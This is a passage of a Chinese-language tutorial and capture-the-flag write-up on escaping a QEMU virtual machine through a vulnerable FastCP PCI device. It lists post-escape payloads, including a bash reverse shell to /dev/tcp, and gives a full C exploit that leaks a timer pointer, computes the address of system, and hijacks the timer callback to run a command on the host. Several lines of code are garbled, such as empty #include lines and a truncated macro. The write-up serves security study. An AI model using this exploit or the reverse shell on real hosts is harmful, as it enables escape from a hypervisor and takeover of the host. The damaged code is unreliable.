  * cat /flag
  * 反弹 shell，/bin/bash -c ‘bash -i >& /dev/tcp/ip/port 0>&1’，在 QEMU 逃逸中，执行 system(“/bin/bash”) 是无法拿到 shell 的，或者说是无法与 shell 内容交互的，必须使用反弹 shell 的形式才能够拿到 shell。
  * 弹出计算器，gnome-calculator，这个大概比较适合用于做演示视频吧。
注意：所有在设备中的操作地址都是指 QEMU 模拟的物理地址，但是程序中使用 mmap 申请的是虚拟地址空间。所以要注意使用 mmap
申请出来的超过一页的部分，在物理空间上不连续。如果需要操作那块空间，需要使用那一页的虚拟地址重新计算对应的物理地址。这个性质在这道题中（超过 0x1000
的物理地址复制），需要额外的注意。
###  2.4 EXP
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PAGE_SHIFT 12
    #define PAGE_SIZE (1 > 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    uint64_t gva_to_gpa(void* addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    }
    void mmio_write(uint64_t addr, uint64_t value)
    {
        *((uint64_t*)(mmio_mem + addr)) = value;
    }
    uint64_t mmio_read(uint64_t addr)
    {
        return *((uint64_t*)(mmio_mem + addr));
    }
    void fastcp_set_list_src(uint64_t list_addr)
    {
        mmio_write(0x8, list_addr);
    }
    void fastcp_set_cnt(uint64_t cnt)
    {
        mmio_write(0x10, cnt);
    }
    void fastcp_do_cmd(uint64_t cmd)
    {
        mmio_write(0x18, cmd);
    }
    void fastcp_do_readfrombuffer(uint64_t addr, uint64_t len)
    {
        struct FastCP_CP_INFO info;
        info.CP_cnt = len;
        info.CP_src = NULL;
        info.CP_dst = addr;
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(1);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(4);
        sleep(1);
    }
    void fastcp_do_writetobuffer(uint64_t addr, uint64_t len)
    {
        struct FastCP_CP_INFO info;
        info.CP_cnt = len;
        info.CP_src = addr;
        info.CP_dst = NULL;
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(1);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(2);
        sleep(1);
    }
    void fastcp_do_movebuffer(uint64_t srcaddr, uint64_t dstaddr, uint64_t len)
    {
        struct FastCP_CP_INFO info[0x11];
        for (int i = 0; i < 0x11; i++)
        {
            info[i].CP_cnt = len;
            info[i].CP_src = srcaddr;
            info[i].CP_dst = dstaddr;
        }
        memcpy(userbuf, &info, sizeof(info));
        fastcp_set_cnt(0x11);
        fastcp_set_list_src(phy_userbuf);
        fastcp_do_cmd(1);
        sleep(1);
    }
    int main(int argc, char* argv[])
    {
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if (mmio_fd == -1)
            die("mmio_fd open failed");
        mmio_mem = mmap(0, 0x100000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (mmio_mem == MAP_FAILED)
            die("mmap mmio_mem failed");
        printf("mmio_mem: %p\n", mmio_mem);
        userbuf = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (userbuf == MAP_FAILED)
            die("mmap userbuf failed");
        mlock(userbuf, 0x10000);
        phy_userbuf = gva_to_gpa(userbuf);
        printf("user buff virtual address: %p\n", userbuf);
        printf("user buff physical address: %p\n", (void*)phy_userbuf);
        fastcp_do_readfrombuffer(phy_userbuf, 0x1030);
        fastcp_do_writetobuffer(phy_userbuf + 0x1000, 0x30);
        fastcp_do_readfrombuffer(phy_userbuf, 0x30);
        uint64_t leak_timer = *(uint64_t*)(&userbuf[0x10]);
        printf("leaking timer: %p\n", (void*)leak_timer);
        fastcp_set_cnt(1);
        uint64_t pie_base = leak_timer - 0x4dce80;
        printf("pie_base: %p\n", (void*)pie_base);
        uint64_t system_plt = pie_base + 0x2C2180;
        printf("system_plt: %p\n", (void*)system_plt);
        uint64_t struct_head = *(uint64_t*)(&userbuf[0x18]);
        struct QEMUTimer timer;
        memset(&timer, 0, sizeof(timer));
        timer.expire_time = 0xffffffffffffffff;
        timer.timer_list = *(uint64_t*)(&userbuf[0x8]);
        timer.cb = system_plt;
        timer.opaque = struct_head + 0xa00 + 0x1000 + 0x30;
        strcpy(&timer.shell, "gnome-calculator");
        memcpy(userbuf + 0x1000, &timer, sizeof(timer));
        fastcp_do_movebuffer(gva_to_gpa(userbuf + 0x1000) - 0x1000, gva_to_gpa(userbuf + 0x1000) - 0x1000, 0x1000 + sizeof(timer));
        fastcp_do_cmd(1);
        return 0;
    }
**执行 EXP 后成功在主机中弹出计算器**
## 03 结语
感谢你的耐心阅读，如果前文中的内容都细看了，那么我相信应该对 QEMU、PCI 设备以及 QEMU 逃逸的过程已经有一个比较深入理解了。
这篇作为 QEMU 逃逸初探文章的第一篇，主要是介绍了 QEMU
的基础知识。但是学习过程只有理论而脱离实践是无法真正学习到知识的，之后的几篇内容都会以实战题目为主要内容来逐步的学习 QEMU
逃逸，也希望读者可以跟着文章中的介绍来动手操作一番。
同时，因为作者的水平有限，我也是在写文章的过程中去学习，文章中的很多代码和图片都来源于参考资料中，虽然我已经尽力的查阅大量的资料去检验内容的正确性，但是很难保证在文章中不出现错误。其中存在着一些主观的理解，这些理解的正确性还需要在之后的实践中来验证。这一点希望读者谅解，也希望发现错误的读者能够在评论区告知我以便修正。
## 04 参考资料
[1] [qemu 逃逸学习笔记](https://blog.csdn.net/qq_31457355/article/details/117170589)
[2] [qemu-pwn-基础知识](https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge)
[3] [[QWB2021 Quals] – EzQtest](https://matshao.com/2021/06/15/QWB2021-Quals-EzQtest/)
[4] [VM escape – QEMU Case Study](http://www.phrack.org/papers/vm-escape-qemu-case-study.html)
[5] [pagemap, from the userspace
perspective](https://www.kernel.org/doc/Documentation/vm/pagemap.txt)
[6] [QEMU 如何虚拟 PCI
设备](https://blog.csdn.net/weixin_43780260/article/details/104410063)
[7] [PCI configuration
space](https://en.wikipedia.org/wiki/PCI_configuration_space)
[8] [What is the difference between an I/O mapped I/O, and a memory mapped I/O
in the interfacing of the microprocessor?](https://www.quora.com/What-is-the-difference-between-an-I-O-mapped-I-O-and-a-memory-mapped-I-O-in-the-interfacing-of-the-microprocessor)
[9] [Github GiantVM pci.md](https://github.com/GiantVM/doc/blob/master/pci.md)
[10] [BlizzardCTF 2017 –
Strng](https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html)
[11] [qemu-pwn 强网杯 2019 两道 qemu 逃逸题 writeup](https://ray-cp.github.io/archivers/qemu-pwn-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E4%B8%A4%E9%81%93qemu%E9%80%83%E9%80%B8%E9%A2%98writeup)